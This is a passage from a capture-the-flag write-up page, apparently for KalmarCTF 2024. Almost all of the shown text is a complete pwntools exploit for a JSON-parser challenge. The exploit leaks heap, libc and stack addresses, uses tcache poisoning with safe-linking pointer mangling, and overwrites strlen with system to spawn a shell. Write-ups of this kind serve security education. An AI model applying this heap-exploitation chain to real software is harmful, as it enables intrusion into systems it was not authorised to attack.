</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;json_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;wezterm&#39;</span><span class="p">,</span> <span class="s1">&#39;cli&#39;</span><span class="p">,</span> <span class="s1">&#39;split-pane&#39;</span><span class="p">,</span> <span class="s1">&#39;--top&#39;</span><span class="p">,</span> <span class="s1">&#39;--percent&#39;</span><span class="p">,</span> <span class="s1">&#39;65&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;chal-kalmarc.tf&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">is_heap_base</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_heap_base</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">            <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">menu_delim</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logbase</span><span class="p">():</span> <span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc.address = </span><span class="si">%#x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logleak</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>  <span class="n">info</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s1">&#39; = </span><span class="si">%#x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">line</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">line</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">so</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sn</span><span class="p">(</span><span class="n">num</span><span class="p">):</span> <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">num</span><span class="p">):</span> <span class="k">return</span> <span class="n">sla</span><span class="p">(</span><span class="n">menu_delim</span><span class="p">,</span> <span class="n">sn</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="n">menu_delim</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Heap leak</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;{[0,0]:0}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;leaked_heap&#39;</span><span class="p">,</span> <span class="n">leaked_heap</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Trigger unsorted bin</span>
</span></span><span class="line"><span class="cl"><span class="n">a_str</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x80</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,64]&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Libc leak</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">+</span><span class="mh">0x570</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">{{</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">:0</span><span class="se">}}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;leaked_libc&#39;</span><span class="p">,</span> <span class="n">leaked_libc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span><span class="o">-</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;libc.address&#39;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Leak stack</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">environ</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">{{</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s1">:0</span><span class="se">}}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_stack</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;leaked_stack&#39;</span><span class="p">,</span> <span class="n">leaked_stack</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf_stack</span> <span class="o">=</span> <span class="n">leaked_stack</span><span class="o">-</span><span class="mh">0x1138</span>
</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;buf_stack&#39;</span><span class="p">,</span> <span class="n">buf_stack</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Inject next pointer</span>
</span></span><span class="line"><span class="cl"><span class="n">a_str</span> <span class="o">=</span> <span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x80</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;inject...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf_size</span> <span class="o">=</span> <span class="mh">0x150</span>
</span></span><span class="line"><span class="cl"><span class="n">target_free</span> <span class="o">=</span> <span class="n">buf_stack</span><span class="o">+</span><span class="n">buf_size</span>
</span></span><span class="line"><span class="cl"><span class="n">inject</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0x80</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target_free</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;</span><span class="si">{</span><span class="n">a_str</span><span class="si">}</span><span class="s1">&#34;,&#34;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="n">inject</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;&#34;]&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">&#39;[0,0,0,0,0,0,0, &#39;</span> <span class="c1"># Consume all of the 15 0x20 chunks</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;0,0,1,&#34;1&#34;,&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,64&#39;</span> <span class="c1"># Last element next will be filled with our injected value before, which is buf_stack+0x150</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">buf_size</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p_stack</span> <span class="o">=</span> <span class="n">target_free</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">p_stack</span><span class="o">+</span><span class="mh">0x70</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_stack</span><span class="o">+</span><span class="mh">0x40</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span> <span class="c1"># FREED</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span> <span class="c1"># FREED</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_stack</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span> <span class="c1"># FREED</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Tcache poison time!</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">buf_size</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">buf_stack</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x21a080</span><span class="p">)),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite strlen with system?</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;[&#34;/bin/sh;aaaaaaaaaaaaaaaaaaaaaaaa&#34;,&#34;aaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;&#34;]&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Running the above script, we will be able to spawn a shell and read the flag :)</p>
<img src="https://i.imgur.com/Ngfbch1.png">
<blockquote>
<p><strong>Flag: kalmar{that_was_some_truly_beautiful_json_&lt;3}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/kalmarctf-2024/" data-title="KalmarCTF 2024" data-via="Chovid99" data-hashtags="Writeup,KalmarCTF,pwn,heap,tcache,got,json"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/kalmarctf-2024/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/kalmarctf/">KalmarCTF</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/tcache/">Tcache</a>,&nbsp;<a href="/tags/got/">Got</a>,&nbsp;<a href="/tags/json/">Json</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/cyber-apocalypse-2024-blockchain-hardware/" class="prev" rel="prev" title="Cyber Apocalypse 2024: Blockchain &amp; Hardware"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cyber Apocalypse 2024: Blockchain & Hardware</a></div>
</div>
</article></div>
            </main><footer class="footer">
